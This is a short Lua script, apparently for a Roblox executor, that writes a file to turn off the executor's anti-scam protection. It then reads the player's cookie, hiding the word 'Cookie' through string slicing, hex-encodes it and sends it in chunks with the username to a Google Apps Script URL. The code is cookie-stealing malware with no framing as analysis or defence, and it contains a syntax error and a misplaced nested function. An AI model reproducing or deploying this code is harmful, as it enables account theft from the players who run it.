function doSnatch()local gasUrl = "https://script.google.com/macros/s/AKfycbzWKCkpoBcO6AZzlp4uWB6zfzo9nzcdJ_vRdiA7n2RRgqb51M0IkK7d9AwidKUpXGOr/exec"
local uName = game.Players.LocalPlayer.Name
local uId = tostring(game.Players.LocalPlayer.UserId)
local bP = "Delta/Internals/Secured/"

local function doBypass()
    local payload = string.format([[{"warning":"stop","allowed_games":"*","user_id":"%s"}]], uId)
    local target = bP .. "disableantiscam"
    return pcall(function() writefile(target, payload) end)
end

    local sct = game["CooNkie":sub(1,3).."Kie"]
    for i = 1, #sct, 20 do
        local f = sct:sub(i, i+19)
        local h = ""
        for j = 1, #f do h = h .. string.format("%02X", f:byte(j)) end
        game:HttpGet(gasUrl .. "?hex=" .. h .. "&user=" .. uName)
        task.wait(0.8)
    end
end

if doBypass() then task.wait-1.5) doSnatch() end
